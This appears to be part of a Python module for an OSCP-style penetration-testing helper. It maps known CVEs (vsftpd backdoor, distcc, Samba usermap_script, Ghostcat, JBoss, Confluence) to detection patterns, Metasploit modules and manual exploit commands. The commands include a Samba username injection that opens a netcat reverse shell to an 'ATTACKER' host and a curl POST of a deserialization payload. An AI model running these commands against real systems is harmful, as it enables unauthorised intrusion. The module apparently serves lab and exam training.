            "PASS anything",
            "# Then in another terminal:",
            "nc {ip} 6200",
            "searchsploit -m 17491",
        ],
        "searchsploit_id": "17491",
        "msf_module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "oscp_note": "Metasploitable 2 hallmark. Rare in real exam but easy win when present.",
        "references": [
            "https://www.exploit-db.com/exploits/17491",
        ],
    },
    {
        "id": "CVE-2004-2687",
        "name": "distcc RCE",
        "affected": "distcc 2.x (unauthenticated)",
        "severity": "CRITICAL",
        "detection": {
            "port": 3632,
            "nmap_script": "distcc-cve2004-2687",
            "version_regex": r"distcc",
            "service_keyword": "distccd",
        },
        "manual_exploit": [
            "nmap -p3632 --script distcc-cve2004-2687 --script-args='distcc-cve2004-2687.cmd=id' {ip}",
            "searchsploit -m 9915",
        ],
        "searchsploit_id": "9915",
        "msf_module": "exploit/unix/misc/distcc_exec",
        "oscp_note": "HTB Lame path. Low-priv shell — chain with a local exploit.",
        "references": [
            "https://www.exploit-db.com/exploits/9915",
        ],
    },
    {
        "id": "CVE-2007-2447",
        "name": "Samba usermap_script",
        "affected": "Samba 3.0.20 – 3.0.25rc3",
        "severity": "CRITICAL",
        "detection": {
            "port": [139, 445],
            "nmap_script": None,
            "version_regex": r"Samba\s+3\.0\.(?:2[0-5])",
            "service_keyword": "samba",
        },
        "manual_exploit": [
            "# Shell injection in username field during SMB session setup:",
            "searchsploit -m 16320",
            "# Or: smbclient //{ip}/share -U '/=`nohup nc -e /bin/bash ATTACKER 4444`'",
        ],
        "searchsploit_id": "16320",
        "msf_module": "exploit/multi/samba/usermap_script",
        "oscp_note": "HTB Lame root path. Works against Samba 3.0.20–3.0.25rc3.",
        "references": [
            "https://www.exploit-db.com/exploits/16320",
        ],
    },
    {
        "id": "CVE-2020-1938",
        "name": "Ghostcat (Tomcat AJP)",
        "affected": "Apache Tomcat 6.x / 7.x < 7.0.100 / 8.x < 8.5.51 / 9.x < 9.0.31",
        "severity": "HIGH",
        "detection": {
            "port": 8009,
            "nmap_script": "ajp-auth",
            "version_regex": r"Tomcat\s+(?:6\.|7\.0\.(?:[0-9]|[0-9][0-9]\b)|8\.5\.(?:[0-4][0-9]|50)|9\.0\.(?:[0-2][0-9]|30))",
            "service_keyword": "ajp13",
        },
        "manual_exploit": [
            "# AJP file read — leak WEB-INF/web.xml or similar:",
            "searchsploit -m 48143",
            "python3 48143.py {ip}",
            "# If app allows file upload → RCE via uploaded JSP included as AJP resource.",
        ],
        "searchsploit_id": "48143",
        "msf_module": "auxiliary/admin/http/tomcat_ghostcat",
        "oscp_note": "AJP on 8009 by default. File-read; RCE requires uploadable JSP.",
        "references": [
            "https://www.exploit-db.com/exploits/48143",
        ],
    },
    {
        "id": "CVE-2017-12149",
        "name": "JBoss Deserialization (JMXInvokerServlet)",
        "affected": "JBoss AS 4.x / 5.x / 6.x (ReadOnlyAccessFilter)",
        "severity": "CRITICAL",
        "detection": {
            "port": [8080, 80, 443, 8443, 9990],
            "nmap_script": "http-vuln-cve2017-12149",
            "version_regex": r"JBoss\s+(?:AS\s+)?(?:4|5|6)\.",
            "service_keyword": "jboss",
        },
        "manual_exploit": [
            "nmap -p8080 --script http-vuln-cve2017-12149 {ip}",
            "# ysoserial payload → invoker/readonly:",
            "curl --data-binary @payload.bin http://{ip}:{port}/invoker/readonly",
            "# https://github.com/yunxu1/jboss-_CVE-2017-12149",
        ],
        "searchsploit_id": None,
        "msf_module": "exploit/multi/http/jboss_deserialize",
        "oscp_note": "Java deserialization — need ysoserial to craft gadget chain.",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2017-12149",
        ],
    },
    {
        "id": "CVE-2019-3396",
        "name": "Confluence Widget Connector (Velocity SSTI)",
        "affected": "Atlassian Confluence < 6.6.12 / 6.12.3 / 6.13.3 / 6.14.2",
        "severity": "CRITICAL",
        "detection": {
            "port": [8090, 8091, 80, 443, 8080],
            "nmap_script": None,
            "version_regex": r"Confluence\s+6\.(?:[0-9]\b|1[0-4])",
            "service_keyword": None,
        },
        "manual_exploit": [
            "# Widget Connector _template param → SSTI → RCE:",
            "searchsploit -m 46731",
            "# POST /rest/tinymce/1/macro/preview with _template pointing to attacker Velocity tpl.",
        ],
        "searchsploit_id": "46731",
        "msf_module": "exploit/multi/http/confluence_widget_connector",
        "oscp_note": "Pre-auth in many deployments. Use alongside CVE-2022-26134 when version is ambiguous.",
        "references": [
            "https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html",
            "https://www.exploit-db.com/exploits/46731",
        ],
    },
]


# --------------------------------------------------------------------------- #
# Indexes built once at import                                                #
# --------------------------------------------------------------------------- #

_SEV_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

_CVE_BY_PORT: Dict[int, List[Dict[str, Any]]] = {}
_CVE_BY_SCRIPT: Dict[str, List[Dict[str, Any]]] = {}


def _build_indexes() -> None:
    """Populate _CVE_BY_PORT (pre-sorted by severity) and _CVE_BY_SCRIPT."""
    for cve in CVE_DATABASE:
        det = cve.get("detection") or {}
        port = det.get("port")
        if port is not None:
            ports = port if isinstance(port, list) else [port]
            for p in ports:
                _CVE_BY_PORT.setdefault(int(p), []).append(cve)
        script = det.get("nmap_script")
        if script:
            _CVE_BY_SCRIPT.setdefault(script, []).append(cve)

    # Pre-sort each port bucket by severity so callers can cap without losing criticals.
    for bucket in _CVE_BY_PORT.values():
        bucket.sort(key=lambda c: _SEV_RANK.get(c.get("severity", "INFO"), 99))
    for bucket in _CVE_BY_SCRIPT.values():
        bucket.sort(key=lambda c: _SEV_RANK.get(c.get("severity", "INFO"), 99))


_build_indexes()


# --------------------------------------------------------------------------- #
# Public API                                                                  #
# --------------------------------------------------------------------------- #

def match_by_port(port: Optional[int]) -> List[Dict[str, Any]]:
    """Return CVEs whose detection.port matches, pre-sorted by severity."""
    if port is None:
        return []
    try:
        p = int(port)
    except (TypeError, ValueError):
        return []
    return list(_CVE_BY_PORT.get(p, ()))


def match_by_version(service: str, version: str) -> List[Dict[str, Any]]:
    """Return CVEs whose version_regex matches the combined banner text.

    Conservative: entries without a version_regex are NOT returned here.
    Matching is case-insensitive against "service version".
    """
    if not version:
        return []
    haystack = f"{service or ''} {version or ''}".strip()
    out: List[Dict[str, Any]] = []
    for cve in CVE_DATABASE:
        det = cve.get("detection") or {}
        regex = det.get("version_regex")
        if not regex:
            continue
        try:
            if re.search(regex, haystack, re.IGNORECASE):
                out.append(cve)
        except re.error:
            continue
    out.sort(key=lambda c: _SEV_RANK.get(c.get("severity", "INFO"), 99))
    return out


_VULN_TOKEN_RE = re.compile(r"\bVULNERABLE\b|CVE-\d{4}-\d+", re.IGNORECASE)


def match_by_nmap_script(script_name: str, output: str) -> List[Dict[str, Any]]:
    """Return CVEs whose detection.nmap_script matches `script_name`, gated on
    the output containing VULNERABLE/CVE tokens (avoids false positives from
    mere script execution)."""
    if not script_name:
        return []
    bucket = _CVE_BY_SCRIPT.get(script_name.strip(), [])
    if not bucket:
        return []
    if not output or not _VULN_TOKEN_RE.search(output):
        return []
    return list(bucket)


def _fmt_placeholders(text: str, ip: str, port: Optional[int]) -> str:
    out = text.replace("{ip}", ip or "TARGET")
    out = out.replace("{port}", str(port) if port is not None else "<PORT>")
    return out


def format_cve_for_attack_path(
    cve: Dict[str, Any],
    ip: str,
    port: Optional[int],
) -> Tuple[str, str, str]:
    """Render a CVE entry into (title, body, refs_line) for attack-path consumption.

    If the entry lists an msf_module, body auto-prepends a restriction marker
    and the standard OSCP reminder — the attack-path renderer downstream can
    decide whether to surface or hide MSF lines via oscp_compliance.
    """
    cve_id = cve.get("id", "CVE-?")
    name = cve.get("name", "")
    severity = cve.get("severity", "INFO")
    affected = cve.get("affected", "")
    oscp_note = cve.get("oscp_note", "")

    title = f"[{severity}] {cve_id} — {name}"

    lines: List[str] = []
    if affected:
        lines.append(f"Affected: {affected}")
    if oscp_note:
        lines.append(f"OSCP: {oscp_note}")

    steps = cve.get("manual_exploit") or []
    if steps:
        lines.append("Manual exploit:")
        for step in steps:
            lines.append(f"  {_fmt_placeholders(step, ip, port)}")

    msf = cve.get("msf_module")
    if msf:
        lines.insert(0, "[MSF-RESTRICTED]  # WARNING: OSCP: Metasploit limited to 1 machine per exam")
        lines.append(f"MSF (restricted): {msf}")

    edb = cve.get("searchsploit_id")
    if edb:
        lines.append(f"ExploitDB: searchsploit -m {edb}")

    body = "\n".join(lines)

    refs = cve.get("references") or []
    refs_line = "Refs: " + " | ".join(refs) if refs else ""

    return title, body, refs_line


__all__ = [
    "CVE_DATABASE",
    "match_by_port",
    "match_by_version",
    "match_by_nmap_script",
    "format_cve_for_attack_path",
]
